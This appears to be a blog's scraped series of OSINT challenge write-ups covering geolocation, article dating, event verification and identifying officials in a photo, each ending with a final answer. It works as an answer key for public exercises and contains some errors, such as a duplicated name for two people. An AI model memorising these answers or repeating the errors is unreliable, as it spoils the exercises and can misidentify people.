coronation. c) Estimate the average speed at which the Queen’s carriage travelled. Identify from which exact door Queen Elizabeth II left Westminster Abbey after her coronation. #\rFor this section we shall first start by searching for the coronation celebration of 1953 on youtube, as the event was witnessed world wide, a video of the celebration can not miss as it was streamed. From the video identified above, I was able to locate a scene where we see the queen leaving the Westminster abbey as shown below. From the video we have been able to identify from which door she left but still there is no enough information for us to use to identify the exact door as the Westminster abbey contains many doors that leave the vicinity as shown below from google earth pro. However doing further research on youtube I found another video that is a bit old but we can clearly see the queen entering the vicinity through the same door as shown below. Watching the video further, we get a glimpse of some features we can use to identify from which side the queen left the vicinity as shown below. After ananlysis, I was able to identify the pattern on the video on the building as shown below. We can now clearly identify which door it was as shown below. Answer: 51°29'58.10\u0026quot;N, 0° 7'42.52\u0026quot;W\nMeasure the distance travelled by the Queen’s carriage, following the 1953 coronation #\rFor this section, I had to search for the coronation walk that the queen did in order to find the streets she passed through and use them to measure distance on google earth pro. From the above image, following the link ,we get to this page that has a map of the streets and how she passed through them towards the Buckingham palace as shown below. Using this map we can now map the landmarks where turns were made and use them to measure the distance. Form the image above, we can see clearly the path followed by the queen the distance covered I got it to be as shown below in kilometers and miles.\n7.89 kilometers\n4.90 miles\nHowever, searching for the actual distance covered during the return to the palace form the Westminster abbey I got it to be 5 miles and 8.2 kilometers Following the link identified by AI, I got this page that details how the queen travelled back to the palace and the distance covered as shown below. Hence the distance covered was 5 miles(8.2 kilometers)\nAnswer: 5miles(8.2 kilometers)\nEstimate the average speed at which the Queen’s carriage travelled #\rFrom the page we found initially containing the routes the queen covered back to the palace also had details about the time she arrived at each spot as shown below. From this time table we can calculate the time taken to arrive at the palace by finding the difference between arrival and departure times using this online calculator as shown below. From the calculator we have found the time difference in different time formats from hours to seconds. Now to calculate the speed we can do it in two ways miles per hour or kilometers per hour that is dividing the distance covered by time taken (Speed=distance/time) using this online calculator as shown below. Speed in miles per hour is 3miless/hour as shown above. Speed in kilometers per hour is 4.92kilometers/hour.\nAnswer: 3 miles/hour or 4.92 kilometers/hour\n","date":"19 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-18/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 18)","type":"posts"},{"content":"\rExercise 17 #\rFor this challenge we are required to find the dates when the blogs were posted, however, the date on the blogs are not normal dates as said in the task briefing below.\nThe majority of countries around the globe use the Gregorian calendar. However, there are other systems to measure and organise time. Below you will find three news articles from countries that have not adopted the Gregorian calendar. Your task is to find out when the articles were published, according to the Gregorian calendar. 1. “ኢትዮጵያዊው አትሌት የቶኪዮ ማራቶን ባለድል ሆኗል !” 2. “प्रहरीमा ५ हजार ४४४ जनाका लागि भर्ना खुल्यो” 3. “در پنجمین شب جشنواره موسیقی فجر کدام گروه‌ها پا به صحنه می‌گذارند؟” ”The Gregorian calendar is the calendar used in most parts of the world. It went into effect in October 1582 following the papal bull Inter gravissimas issued by Pope Gregory XIII, which introduced it as a modification of, and replacement for, the Julian calendar. The principal change was to space leap years differently so as to make the average calendar year 365.2425 days long, more closely approximating the 365.2422-day \u0026ldquo;tropical\u0026rdquo; or \u0026ldquo;solar\u0026rdquo; year that is determined by the Earth\u0026rsquo;s revolution around the Sun.” According to wikipedia\nWe can be able to view countries that use the gregorian calendar from this link.\nWith that small introduction we can now find the dates when the blogs were published.\n“ኢትዮጵያዊው አትሌት የቶኪዮ ማራቶን ባለድል ሆኗል !”(\u0026quot;Ethiopian athlete wins Tokyo Marathon!\u0026quot;) #\rWe have been provided with a link to the article, we can navigate to the link and see how the article looks like as shown below.\nSince I know how the Ethiopian flag looks like, I clearly knew the post was made in amharic language and the post was made in 2020, we can now translate the page to English and read what it is about.\nInteresting, analyzing the image further, it seems the marathoner won the tokyo 2020 marathon. To find more information, I inspected the source code to see if we will find information on when the post was published as shown below.\nFrom the source code it was published on March 1, 2020 , we can search further to see if this post was truly published on this date.\nLook what we found, the same image as the one from the article, following the link we can clearly see the winner is the same person as from the article and it was on March 1, 2020\nAnswer: March 1, 2020\n“प्रहरीमा ५ हजार ४४४ जनाका लागि भर्ना खुल्यो”(\u0026quot;Police recruitment opens for 5,444 people\u0026quot;) #\rThe link to the article directs us to this page shown below.\nat first I did not know the language but after translating the page I found it was in nepalese as shown below.\nAlthough the post had a date when it was published, the date was still looking weird to me as shown below.\nAt First even translating the page,I was not able to get the time shown above which seems to be the tag for when the post was made but transalting the page to its original language and using google translate, I was able to find the date as shown below.\n2072, it seems we are in a different earth as in flash series, we are in some earth 12 or something 😅. Anyway, from the translated data, we have some useful information the month magh ,year 2072 and day 17 we can use a calendar converter for nepalese calendar and see what day it was as shown below.\nBefore conversion.\nAfter conversion, we get our date January 31, 2016\nAnswer: January 31, 2016\n“در پنجمین شب جشنواره موسیقی فجر کدام گروه‌ها پا به صحنه می‌گذارند؟”(“Which bands will take the stage on the fifth night of the Fajr Music Festival?”) #\rFor this one as well we have the link to the article provided to us just like the other articles. Navigating to the article we are met with a page written in Persian language as from the translation of the article title.\nTranslating the page, we get to see the published date as shown below.\nesfand to me looks like we have a month but with this small translation, it is not enough information for us to use, I decided to translate the date back to its original language and use google translate to convert the date alone and see what we get as shown below.\nMarch 2, 1401 with this translation we can now say we have the year 1401, and day 2 as the month we earlier got it to be Esfand as some times google translate may mistranslate some words, furthermore, going through the blog this was a musical festival conducted in more than one day as shown below.\nNow we can use the data (Esfand 2 1401) we have gathered about the date when the post was made and look for a Persian calendar translator to give us the date when the post was made. I found this translator online.\nAfter translating our date, we got the day as shown above February 21, 2023\nAnswer: February 21, 2023\nLessons learned #\rFrom this OSINT challenges, I was able to learn an important skill in OSINT, DO NOT ASSUME as for each challenge I inspected the source codes for the times of publication for each post but had to do more research online to verify if the dates were truly correct.\n","date":"18 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-17/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 17)","type":"posts"},{"content":"\rExercise 16 #\rThis challenge was quite mind draining, we are required to find the location where the military aircraft was flying over as described in the task briefing below.\nOn November 25, 2020, a Twitter user shared the photo below. It depicted a military aircraft flying over an “undisclosed location”. Your task is to disclose that location. A clearer image for the same is shown below.\nFinding the location #\rFor us to find more details, we shall perform a reverse image search and see if we can find more information about the aircraft.\nFrom tineye, we got some interesting information, I shall be looking into the alamy source as it contains more stock images for the same.\nForm the image we have gotten some information Operation inherent resolve, May 31,2017, battle areas, Air force A-10 Thunderbolt II with this information we can search to find more details about the operation and where it was being conducted on May 31,2017 and it is likely to be in a war tone country and from the picture, it could in a semi-arid regions.\nWe now know the operation was a joint task force between US, Iraq and Syria. Searching on alamy images for the same operation and filtering for the date May 31,2017 ,we get more images that can help us identify our location and we are also able to find our challenge image as shown below.\nGoing through the photos, I was able to identify this photos that have unique geographical structures that can aid in locating our location.\nWith those images we can now play around with google earth pro to find the locations identified. This route was very tiresome, however, doing more research about the mission, I came across this document giving details of locations where strikes were made.\nThe analysis from one of the photos I found is as shown below.\nWe have been able to identify one photo and where the aircraft was at the moment.\nThe second place from the image collections we have been able to locate it.\nAfter a while of roaming through the map, I was able to find the location of where our air-craft was located as shown below.\nAnswer: 37°39'21.98\u0026quot;N, 38° 5'41.83\u0026quot;E\n","date":"17 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-16/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 16)","type":"posts"},{"content":"\rExercise 15 #\rFor this challenge we are given a picture giving a description of a telescope we have to find it and locate where it is placed as described in the task briefing below.\nThe image below is a screenshot taken from a CIA declassified document. It depicts a caption report of an undisclosed photo taken by an agent. The text mentions a telescope “being assembled at factory“. Your task is to find: a) A photo that matches the description on the caption report. b) The exact location of where the telescope was placed once completed. A photo that matches the description on the caption report #\rFrom the above photo, we can see some clear descriptions of the telescope. The information I used is telescope for the university of bonn, built at the askania factory, jan 18, 1953 with this information we can search for the telescope on google and see what we shall find as shown below.\nInteresting findings, going to the first link and searching through the page, I got an interesting image with some information form our challenge document as shown below.\nTo verify if this is our telescope, I searched for it and see its elements if they match the description on the document.\nAs seen above from this source, we can now verify the telescope we fund matches the description on the document.\nTherefore the telescope being identified is as shown below.\nThe exact location of where the telescope was placed once completed #\rFrom this site,we got a description of the telescope and where it is located at the Hoher list observatory as shown below.\nSearching on the same page again for Tower 1 I got an image of the tower as seen below.\nWe can search on google maps for the Bonn observatory and see if we can be able to locate the tower with the following patterns as described below.\nFrom google maps we have been able to identify a tower with the surrounding descriptions from our analyzed image above as shown below.\nTo confirm if it is the tower we can see if there is a street view of the place and see if we can identify if it is truly the tower.\nWith that evidence we can now clearly identify that our tower is as shown below.\nAnswer: **50°09'42.6\u0026quot;N 6°50'54.0\u0026quot;E**\n","date":"15 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-15/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 15)","type":"posts"},{"content":"\rExercise 14 #\rFor this challenge we are required to find the magnitude of the earthquake and the coordinates of the camera used to record the place as described in the briefing below.\nThe video below was recorded during an earthquake. Please find the answer to the following questions: a) What was the magnitude of this earthquake? b) What are the coordinates of where the camera was likely located in order to record this scene? link to the video is here.\nWhat was the magnitude of this earthquake #\rFor this question, we shall first start by identifying the location on the video. Just like reverse image search there are tools used to do reverse video search, we need to do a reverse image search to see if the video was only from Sofia Santos or someone else.\nThe tool we shall use for this task is called InViD, where we shall upload the video link to it and it will generate images that we can ten do a reverse image search of them as shown below.\nAs seen above snapshots of the video were taken and through the tool we can do a reverse image search of the photos.\nAs seen above we have a youtube link of the same place,however the video caption says it was 2018 and from the cctv photo-age it is dated 2016 but we have some information from the youtube video of the place which is Bucharest,Romania as shown below,.\nWe can search on google to see the magnitude of the earthquake of 2016 in Romania.\nFrom our search we get a magnitude of 5.6.\nLet’s search for the government announcement of Romania concerning the earthquake and see if he magnitudes are the same but I was unable to find some concrete information. However, going back to the youtube video we found earlier of our challenge video and looking at the comments someone has commented that there are rarely earthquakes in Romania.\nSearching if there were earthquakes experienced by countries bordering Romania, I found some interesting information on Moldova country as shown below.\nAnswer: 5.8\nWhat are the coordinates of where the camera was likely located in order to record this scene? #\rFor this section we shall go back to our video and try to identify some features as shown below.\nWith this findings, I searched for malls first in Romania and see if I can find anything related to my images above, however, this path was tiresome, I therefore went back and did a reverse image search with yandex from the video reverse search we did earlier and found this particular image.\nGoing to the link, I found the exact video of the event as shown below.\nTranslating the video caption name, I got the following.\nEarthquake Chisinau now I can further crop the image to this particular buildling and search for it in chisinau as shown below.\nWe have been able to find the building atrium shopping mall and where it is located, Moldova near Bic river.\nBuilding from google earth pro.\nWe can now try to pin point where the camera was.\nBelow is an image showing the coordinates.\nAnswer: 47°00'57.6\u0026quot;N 28°51'14.1\u0026quot;E\n","date":"14 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-14/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 14)","type":"posts"},{"content":"\rExercise 12 #\rThis challenge was a medium one for me, playing around with reverse image search and searching for the heat map. Below is the task briefing.\nThe screenshot below shows satellite imagery from a coastal area. Each red pixel represents a 30 metre centre point containing a thermal anomaly. The data is from January. Please analyse the screenshot and answer the following questions: a) Which website was used to produce the image below? b) Which is the country seen in the image? c) The screenshot shows data from a specific date. Which is the date? Which website was used to produce the image #\rFor this section I did a reverse image search as shown below and was able to find the site after verifying the resemblance of the site and the image above.\nClicking on the link, we are redirected to this site shown below.\nand from the site their is a post made that shows FIRMS(Fire information for Resource Management System), searching online for the site we find the following results.\nClicking on the second link, I got some interesting information where by I had to put the site on another window along side the challenge image and analyzed the two and some identifiers from the challenge image verified this site to be the one where the screenshot was taken from as shown below.\nAnswer: [NASA FIRMS](https://firms.modaps.eosdis.nasa.gov/map/#d:24hrs;@0.0,0.0,3.0z)\nWhich is the country seen in the image #\rFrom the previous question we have solve, when we were doing reverse image search, we found information that resembled our image as shown below.\nTo confirm if the findings were true, I had to place the images along side each other and verify our findings to be true as shown below(I used the one indicated ‘The Old Vine Conference)\nThe two images were not looking similar but since we are searching for the country I decided to start with Chile that is indicated in the blog site we found for the old vine conference to look at the coastal borders, moreover, the coastal region seems to be bordering a water body to the west.\nAs seen above after searching for the country Chile on NASA FIRMS’ site and looking at the coastal region, I found a region that resembles our image as shown above.\nAnswer: Chile\nThe screenshot shows data from a specific date. Which is the date? #\rFor this section I had to go back to the task briefing, we are told The data is from January using this data I searched on google fire in Chile that happened in January as shown below.\nIt appears Chile experienced wild fires on January 2017 with this we can go back to NASA FIRMS and tweak the dates to find the exact date, as shown below after some tweaking we got the exact date.\nAnswer: January 26,2017\nWith that we have solved our entire challenge.\n","date":"13 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-12/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 12)","type":"posts"},{"content":"\rExercise 11 #\rThis challenge was quite hard for me, we are provided with an image that is not completely clear, however, we are required to find the name of the four individuals on the image as stated in the task briefing as shown below.\nThe photo below depicts four individuals. Your task is to identify them all. Above is the image we are required to use to find the name of the individuals on the image.\nWe shall start by doing a reverse image search to see if we can find any information about the image.\nWe have found some information skhirat Agreement and some links, I decided to follow the one for United Nations.\nThe photo is by UNSMIL(United Nations Support Mission in Libya). We can head to UNSMIL and look around if we can get more information about the image but from the photo we can identify some information as shown below.\nAs analyzed form the image above we can start searching for one individual at a time, furthermore as from our searches, this event was conducted by UN. As I have witnessed, more than one event conducted by the UN are usually filled with audience and important guest of the events surely seat at the front row. From UNSMIL, I was able to identify our photo and more with individuals on our photo as shown below.\nAnalysis from the challenge image\nI tried to do a reverse search for the people identified but got no useful information however, searching for the agreement form they signed got me a bit of information. With this form, I could search for the event further.\nhere is a clearer image.\nSearching the internet, I was able to find one of the members in the challenge photo as shown below.\nPerson 1 #\rFollowing the link, we are given clearly the name as shown below.\nSearching his name online, we get more details about the person.\nSearching further his full name is Moustafa Abushakor Ghaith\nPerson 2 #\rI found an image of this member\nWhat made come to conclusion he was among the members in the photo was after I carefully analyzed the hair pattern of the individual in the challenge photo and this photo.\nscrolling through the photos, I found the same person again signing the document we identified earlier as shown below.\nIf we zoom a little bit closer, we can be able to identify the location of where the person was signing as shown below.\nwith that we can get the name of the person from this file using google translate.\nUsing google translate, it was unable to get the whole name as shown below.\nhowever, I searched for the document that was signed and found his name after searching through all the names in this document . His name is Salih Hama bakdah\nPerson 3 and 4 #\rAfter finding this document and searching the names, I was able to identify the two remaining people. As shown below.\nperson 3 (فضيل محمد الأمين )Fadil Mohamed Alamen\nFor me to identify it was this man shown below was the cheeks after looking through some of his photos and comparing it with the one on the challenge photo.\nperson 4 (محمد سعد امعزب)Fadil Mohamed Alamen\nWhat enabled me to identify person 4 as shown above was the following identifiers as shown below.\nThis challenge was not easy but I learnt a lot concerning how to study human facial structure for facial recognition,however there are systems nowadays that can do this automatically without manual intervention most of the time thanks to artificial intelligence.\n","date":"12 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-11/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 11)","type":"posts"},{"content":"\rExercise 10 #\rFor this challenge we are required to analyze the photos in the tweet to answer the questions that are in the task briefing as detailed below.\nA Twitter user shared three photos of an event. Please answer the following questions: a) Which event is being celebrated in the photos? b) Which two photos were taken by the same person? c) The two photos mentioned above were taken in the same city. The photographer was previously in a different city. Find out the name of that city. Which event is being celebrated in the photos? #\rFor this section we can read the tweet to see if we can find some interesting information that can help us identify the event.We have some information we can search to find the event zangbeto dolls , African voodoo festival and mysticism .\nSearching online, the zangbeto doll is a traditional Vodún guardians of the night among the Ogu (or Egun) people of Benin, Togo, and Nigeria. This tells us the festival is usually conducted in west African countries. Looking at the images section, I found an image which on clicking I got other images and the name of the festival as shown below.\nAnswer: Benin voodoo festival\nWhich two photos were taken by the same person? #\rFrom the previous question, we saw one image from which we can search the photographer and see if he has more images for the same event.\nClicking on the highlighted image above, I got more images for the same but there was one which provided more details from getty images as shown below.\nFound the name of the photographer, we can search the name in the getty images gallery and see more photos that he has.\nand we have found another photo by the same photographer. Hence the two photos that were taken by the same photographer are as highlighted below.\nThe photographer was previously in a different city. Find out the name of that city. #\rFor this section we can search for the photographer’s social media and see if he has posted some information of his whereabouts, I will start with my favorite platform, twitter.\nI found a post by him, clicking on it we get details of where he was as shown below.\nBut for us to verify we shall search the place in google maps and see where it is .\nWe now have our answer, he was in Cotonou Benin.\nAnswer:Cotonou, Benin\n","date":"11 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-10/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 10)","type":"posts"},{"content":"\rExercise 9 #\rThis challenge was interesting, we are given a video to analyze and answer the questions that follow in the task briefing as shown below.\nThe video below was shared by the Visit Tirana Twitter account on February 16, 2023. Please answer the following questions: a) To the best of your knowledge, at what time was the video recorded? b) Find the coordinates of where the person was walking at the time of the recording. Here is the video link. and the tweet as well form twitter\nTo the best of your knowledge, at what time was the video recorded? #\rFrom the tweet itself, we have some interesting information.\nThe name of the photographer Eriseld Myrto The name of the city where the recording was done Tirana,Albania with that information we can start by searching if visit tirana has a website which I found using some google dorking as shown below.\nHowever this did not give me much information, but doing further searches online, I found that the photographer had different alias names on instagram, tiktok, facebook. Form Instagram, we can inspect the source code to get the time when the video was recorded.\nFrom the screenshot above we can only see the date when it was uploaded but when we inspect the source code we get more details such as time as shown below.\nnow we have the time when the video was uploaded.\nAnswer: 2023-02-16T16:48:43.000Z\nFind the coordinates of where the person was walking at the time of the recording. #\rFor this section,we shall review the video again taking note of some important features we can use to identify the place easily as shown below.\nThere is a two identical buildings with one taller than the other, there is a walk path at the middle of the road that seems to be a bike path and pedestrians can also use for walking.\nWith that lets try and perform a reverse image search and see if we can identify the location of the buildings.\ntirana garden building is how the building was identified. We can search that building up on earth pro and see the area.\nwe have been able to identify the street, we can now play around with street view to see where the person was standing.\nForm the above image we have made a side by side analysis and found where the photographer was standing, we can now get the coordinates of the position.\nAnswer:41.3270062,19.8072923\n","date":"10 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-9/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 9)","type":"posts"},{"content":"\rExercise 8 #\rIn this challenge we are provided with an image of a gazette where we are required to achive the following taks.\nPlease answer the following questions: a) What was the audience applauding? b) When was the photo taken? c) What is the name of the venue? What was the audience applauding? #\rFor this section, first we shall use google translate to change the words into a language we can read easily as shown below.\nWith that we can search the news outlet which is epoch times and the performance was by shen yun.\nAnswer: Shen Yun's performance of 2023 world tour\nWhen was the photo taken and the name of the venue? #\rFor this section we shall perform some reverse image search to see if we can find anything of interest to us.\nAs shown above, we are able to find some details about the event. Interesting, we can now easily find more information about the event by accessing the two links I have identified in the image.\nFrom this link we got all the information about the image, the picture was taken on January 7,2023.\nsearching the name of the venue on google maps and having a street view of the same, we can easily verify the location of the venue.\nAnswer: Date when photo was taken:Janary 7,2023 venue: Chrysler Hall in Norfolk, Virginia\n","date":"8 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-8/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 8)","type":"posts"},{"content":"\rExercise 6 #\rFor this challenge we are required to verify if the image posted on the journalist’s twitter page is true. In this lab we shall be learning the skill for data verification as the internet is filled with a lot of misinformation, no matter who says something on the internet, the data has to be verified as in the case above, the journalist is a verified journalist but the photo posted has to be confirmed even though the information seems to be true. In an OSINT investigation, data found has to be verified to be factual be fore coming up with a report.\nBelow is the task briefing.\nTask briefing: On January 19, 2023, a journalist with almost 140k followers on Twitter shared an image of a destroyed vehicle amidst a large cloud of smoke and fire. The tweet said: “BREAKING: TTP carried out a suicide attack on a police post in Khyber city of Pakistan that killed three Pakistani police officers.“ The photo is not of the event described by the journalist. a) Verify the statement above. From the tweet the post was made on January 19, 2023 but when I did a reverse image search I got more than one result form tin-eye as shown below some images indexed dating as old as 2009.\nWith the above findings it is clear the post was a false information source for the case. However doing further research, the bombing scene identified above happened in Baghdad, the image metadata info found form this link form the Tineye reverse image searches.\nThe incident happened in august 7, 2006 in Waziriya, Iraq as seen above.\n","date":"6 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-6/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 6)","type":"posts"},{"content":"\rExercise 7 #\rThis challenge was fun to do, below is the task briefing.\nThe photo below was taken a few years ago in a beautiful city. Your task is to find the answers to the following questions: a) Where was the photo taken? b) In which year was the photo taken? c) The big poster on the right contained a link to a website. What was the link? to get the full image you can access it from this link.\nWhere was the photo taken? #\rFor this section, I did a reverse image search using google lens and found the name of the location as shown below.\nFrom the above search we now know the location is lisbon where there is a mall called vasco da gama, but wait with history I know vasco da gama was a Portuguese explorer, with that we can now head to google maps and search for vasco da gama mall in Lisbon, Portugal and see where the image was taken as shown below.\nAs seen above the structure in our image is right in front of the vasco da gamma mall, from the image challenge, the photo was taken from the top of the escalator. The entire place is called Parque das Nações.\nAnswer: **Parque das Nações, Lisbon Portugal**\nwhich year was the photo taken and What was the link ? #\rFor this section, we had to find the poster in the image in which it is an event advert form there we shall get the year when the photo was taken as event adverts are usually dated when they will happen.\nWe shall play around with google earth pro street view and time adjustments to see if we can find the poster from the image as shown in the challenge photo and probably find the link in the poster as well.\nWe have been able to identify where the poster was placed on the wall. Tried to play around with the street on google earth pro but I was unable to find the year of the poster, I decided to look up closely on the image and try to read the readings on the poster by cropping the image to have the poster alone and perform a reverse image search for the poster as shown below.\nthe image of the poster cropped from the main picture.\nPerforming reverse image search, I was able to get the name of the event and write-ups too as well. Now the event is Tutakhamon this is according to venice searching on google for the same event that happened on Portugal I found the the following.\nThe event was called tutankamon in Portuguese. Searching again for the event, I found the exact poster as shown below.\nFollowing the Facebook post, I was able to find the year and link on the poster as shown below.\nAnswer: year=2019, link= www.tutankamon.pt\n","date":"6 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-7/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 7)","type":"posts"},{"content":"\rExercise 5 #\rIn this challenge we are required to find the location of the bears as stated in the task briefing below.\nTask briefing: The image below is a screenshot from a zoo live cam. It was taken on January 15, 2023 at around 2pm local time. Please answer the questions below: a) In which zoo are these polar bears located? b) What was the temperature at the time of the screenshot? c) What were the exact coordinates of where the bears were lying down? To download the image, you can access it form this link.\nwhich zoo are these polar bears located #\rFor this section we shall start by doing a reverse image search of the image and see if we can find a picture resembling the location shown on the image. After doing the reverse search, I got a writeup to this challenge but that is not what I was intending to get, therefore reverse image search did not serve my purpose.\nFrom the task briefing we have some information we can use to get the location of the zoo,screenshot from a zoo live cam .This information will help find the zoo as it seems this zoo is unique as there are live cams that record the bears.\nAs seen above there are two zoos available, however, going through the Alaska zoo, I found nothing close to the photo that was taken but going through the san diego live cam feed on their website, I found the location of the photo with some identifying factors form the challenge photo as shown below.\nImage captured from the San Diego zoo live feed camera.\nIdentifying factors from the challenge picture.\nWith that we have found the name of the zoo where the polar bears are located.\nAnswer: San Diego zoo\nThe temperature at the time of the screenshot #\rThis one was interesting as I got to find out that America usually has historical data of temperature for different areas, this information I was able to get it after doing some searches online on how to get temperature data of pat days. The information for the temperature I was able to get it form this site.\nForm the task briefing, the image was taken on January 15, 2023 at around 2pm local time with this, we can be able to get the approximate temperature.\nThe closest time range I could get close to 2pm was as shown below.\nThe temperature is in Fahrenheit, we can convert to degrees Celsius using this tool as shown below.\nThe temperature is approximately 17 degrees Celsius.\nAnswer: 62 fahrenheit or 16.67 degrees celsius\nThe exact coordinates of where the bears were lying down #\rFor this section we shall use google map to find the exact coordinates of where the bears were lying as shown below.\nFrom the image in the challenge, we can see that there is an identifying factor that will aid us in getting the location of where the bears were lying.\nImage analysis form the challenge photo.\nAs shown above the bears were lying close to the area with less grass on the edge(Less bushy edge) from the google maps, we can identify the area where this area is located as shown below.\nFrom the image above we can now find the exact coordinates of where the bears were lying.\nAnswer: 32°44'03.9\u0026quot;N 117°09'16.6\u0026quot;W\n","date":"5 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-5/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 5)","type":"posts"},{"content":"\rExercise 4 #\rThis challenge was quite easy as seen below are the tasks briefings.\nTask briefing: This is a photo of a resort located on an island. a) What is the name of the resort? b) What are the coordinates of the island? c) In which cardinal direction was the camera facing when the photo was taken? We can access the image from this link.\nThe name of the resort #\rFor this section we could do a reverse image search to get the name of the resort, for me I used this extension that allows you to search for the image using image searchers such as yandex,TinEye, bing and google lens\nHowever,going through the various searches found in the different search engines, google lens and Bing were the only one that gave me the exact image that I was looking for as shown below.\nResults as per google lens.\nResults as per Bing search.\nAs seen above Bing was also able to find a write-up done by another person but I preferred focusing on finding the results on my own. As for google lens, we were able to find the image and we found a website for the resort containing the image as the background of the website as shown below.\nAnswer: Oan Resort\nThe coordinates of the island. #\rFor this section we are required to search for the co-ordinates of the resort, this was easy as we could search the resort straight from google maps and get the exact coordinates of the island as sown below.\nAnswer: 7°21'49.0\u0026quot;N 151°45'22.4\u0026quot;E\nCardinal direction the camera was facing when the photo was taken. #\rFor this section we shall play around with google earth pro using the coordinates from google maps and put the image along side the window for google earth pro to get the exact cardinal direction the camera was facing as shown below.\nAs shown above, we have found the exact cardinal direction from which the camera was facing when the picture was taken.\nAnswer: North West\n","date":"4 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-4/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 4)","type":"posts"},{"content":"\rExercise 3 #\rIn this challenge we are required to find the name and coordinates of the location where the photo was taken from.\nTask briefing: In April 2017 Mohamed Abdullahi Farmaajo, the then president of Somalia, visited Turkey. A news agency published a photo where he was seen shaking hands with Recep Tayyip Erdoğan, the country’s president. The article did not disclose where the photo was taken. Your task is to find out the name and coordinates of the location seen below. To be able to download the image alone you can download it from this link.\nFrom the image seen in the tweet above, we can derive some crucial information that we can use to find the location. First, the date when the post was made is April 2017 and the country where the photo was taken is Turkey. With this information we can search the internet and adjust the date to range from first to the last day of the month of April as shown below.\nFrom the image above after making the search Somalia Turkey, we then click on the tools then select Any time where you will get a drop down and choose custom range where you will be required to put a range of date in American format to which your search will be ranging from as shown below.\nAfter putting the range we get the following searches.\nFrom the image above we can click on the third search as it matches with our tweet post we got for the challenge to see if we can find some interesting information of where the image could be taken, going through the article there is some identifying information, Presidential palace.\nWith that we can go to google maps and search turkey presidential palace and try identify the location of the image.\nFrom the image we have from the challenge it seems the image was taken in front of a door, we can try search it and see the location of the door.\nFrom the image above, the door seems to be located at the entrance of the palace as identified in the images above. Therefore, from our google maps search, the location could be as indicated below.\nWe can copy the coordinates and go to google earth pro and find the location and try to play with the time frame in google earth to try and find a picture that was taken showing a portion of the door.\nAdjusting the time to 2020, we are able to find the door where it is and with that we now have the location and coordinates of where the picture was taken.\nAnswer: Location=Presidential Complex Co-ordinates=39°55'51\u0026quot;N 32°47'58\u0026quot;E\n","date":"3 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-3/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 3)","type":"posts"},{"content":"\rExercise 1 #\rIn this challenge we shall be getting the coordinates of where the photo was taken as shown in the description.\nTask briefing: Below you can see a screenshot from a tweet containing a photo. It contains all the relevant information necessary to help you find the exact location. Please identify the coordinates of where the photo was taken. We are given a photo form twitter to get the coordinates of the image\nHowever, to get the image alone we can download it form this link. We shall start by analyzing the image first, furthermore, from the tweet, it seems the image was taken from a town called Kiffa. Doing some search on line, the city is located in Mauritania.\nAt least now we have a small geographical area to conduct our search of the image but lets first analyze the image.\nAs shown above we have analyzed the image, and now we can play around with google earth pro to identify the exact coordinates of the image. To add, the image shows clearly the roads are tarmacked as for many roads in semi-arid regions are usually murram roads and the photo was taken on 2013 february as palces do develop, we shall need to adjust the time frame to 2013 as shown below.\nWith that set we can now try and find from the map areas around kiffa where there are tarmac roads to easily identify our location. After some few minutes of combing through the map, I found the location of where the image was taken as shown below.\nThe coordinates of the area were 16°36'33\u0026quot;N 11°23'52\u0026quot;W. Moreover, the tweet said “present themselves to the newcomers” looking at the area ahead, there is an airport, the newcomers being referred to could be the tourist.\nThis challenge was quite interesting. The tools used are google earth pro (I know it is pro but it is not paid for, it is absolutely free.).\nTo find the time when the image was taken one could use the shademap tool to look at the shadow formation by adjusting the time, to understand on how to solve the challenge using the tool you could read this writeup by notmugrat.\n","date":"1 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-1/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 1)","type":"posts"},{"content":"\rExercise 2 #\rIn this challenge we are required to find the name of the train station and the name and height of the tallest building in the image.\nTask briefing: The photo below was shared on social media. It clearly depicts a train station. Please answer the following questions: a) What is the name of the train station seen in the photo? b) What is the name and height of the tallest structure seen in the photo? The image we are given is as shown below.\nHowever, if you want the entire image you can download it from this link.\nname of the train station seen in the photo #\rTo find the name of the train station we could use reverse image search or simply search on google maps the name that is clearly seen in the image.\nWe shall start with reverse image search where I will be using google lens for this instance but there are a variety of tools for doing reverse image search such as\nPimeye googl lens Tineye yandex reveye(This is an extension that can be downloaded on your browser to aid in doing reverse image searches) just to mention a few.\nUsing google lens we found the name of the railway station as shown below.\nTo confirm if that is the real name of the station we could search the name flinders street on google maps or google earth pro and see if we shall get the station.\nSearch as of google earth pro.\nSearch as of google maps.\nAnswer: Flinders Street Railway Station\nname and height of the tallest structure seen in the photo #\rNow for this section we had to find the street view in order to identify the buildings seen on the image and search for their heights online as it is hard to tell the height of a building from an image.\nFrom google earth pro street view we are able to see four buildings that are available but one building is missing.\nStreet view analysis from google earth pro.\nThe building that is missing from the street view image.\nHowever, from the street view image I did some deep google search of the height of the four buildings I identified but two had heights that caught my interest as shown below.\nThe 